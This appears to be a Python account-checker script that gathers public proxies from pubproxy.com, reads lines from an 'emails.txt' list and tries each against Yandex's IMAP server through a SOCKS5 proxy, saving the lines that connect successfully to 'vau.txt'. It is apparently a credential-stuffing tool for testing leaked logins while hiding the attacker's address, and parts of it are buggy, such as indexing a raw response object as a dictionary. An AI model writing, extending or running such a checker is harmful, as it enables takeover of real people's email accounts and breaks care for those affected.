from proxy_connect import check_validity, connect_to_proxy
from concurrent.futures import ThreadPoolExecutor
from socks import PROXY_TYPE_SOCKS5
import requests, random, asyncio

HTTPS_PROXY_DICT = {'http': 'http://117.135.251.209:80',
                    'https': 'http://200.223.245.178:8080'}

SOCKS5_PROXY_LIST = [("198.11.137.72",80), ]

HTTPS_PROXY_LIST = []

UNRESOLVED_JSON_LIST = []



def get_socks_proxy(proxy=None):
    if proxy is None:
        json_obj = requests.get("http://pubproxy.com/api/proxy?type=socks5")
    else:
        json_obj = requests.get("http://pubproxy.com/api/proxy?type=socks5", proxies=proxy)
    SOCKS5_PROXY_LIST.append((str(json_obj["ip"]), int(json_obj["port"])))

def get_http_proxy(proxy=None):
    if proxy is None:
        json_objraw = requests.get("http://pubproxy.com/api/proxy?https=true")
    else:
        json_objraw = requests.get("http://pubproxy.com/api/proxy?https=true", proxies=proxy)
    print(json_objraw)
    json_obj = json_objraw.json()
    print(json_obj)
    https = "https"
    HTTPS_PROXY_LIST.append((https, "http://" + str(json_obj['data'][0]['ipPort'])))

def proxy_resolver(line):
    our_tuple = tuple(line)
    dicti = {our_tuple[0]:our_tuple[1]}
    return dicti

def get_https_proxies():
    file = open("http.txt", 'r')
    for line in file:
        proxy = proxy_resolver(line)
        print(proxy)
        get_http_proxy(proxy)
    file.close()
    file = open('http.txt', 'a+')
    for line in HTTPS_PROXY_LIST:
        file.write(str(line))

def work():
    for i in range(10):
        get_socks_proxy()
        get_http_proxy()
    file = open("http.txt", "w")
    file2 = open("socks5.txt", "w")
    for i in SOCKS5_PROXY_LIST:
        file2.write(str(i))

    for i in HTTPS_PROXY_LIST:
        file.write(str(i) )

def fill_socks5():
    file = open("neww.txt", 'r')
    for line in file:
        addr, ip = (line.strip()).split(":")
        SOCKS5_PROXY_LIST.append((addr, int(ip)))
    print(SOCKS5_PROXY_LIST)

def filter():
    storage = list()
    file = open("new.txt", 'r')
    count = 0
    for line in file:
        count += 1
        if count == 6:
            storage.append((line).replace("\t", ":"))
            count = 0
    print(storage)
    file.close()
    file = open("neww.txt", 'a+')
    file.writelines(storage)

@asyncio.coroutine
def work_socks5(line):
    imap_server = "imap.yandex.ru"
    imap_port = 993
    integer = random.randint(0, len(SOCKS5_PROXY_LIST) - 1)
    proxy_addr, proxy_port = SOCKS5_PROXY_LIST[integer]
    proxy_addr = "188.120.229.27"
    proxy_port = 12613
    proxy_type = "socks5"
    resp = connect_to_proxy(imap_server, imap_port, proxy_addr, proxy_port, proxy_type, line)
    if resp is not None:
        STORAGE.append(line)


if __name__ == '__main__':
    STORAGE = list()
    loop = asyncio.get_event_loop()
    pool = ThreadPoolExecutor(max_workers=10)  # You can probably increase max_workers, because the threads are almost exclusively doing I/O.
    file = open("emails.txt", 'r', encoding='latin-1')
    data = list()
    c = 0
    for i in file:
        data.append(i)
        c += 1
        if c == 50:
            break
    fill_socks5()

    loop.run_until_complete(asyncio.wait([work_socks5(line) for line in data]))
    loop.close()

    print(STORAGE)
    file = open("vau.txt", "w")
    for line in STORAGE:
        file.write(line)
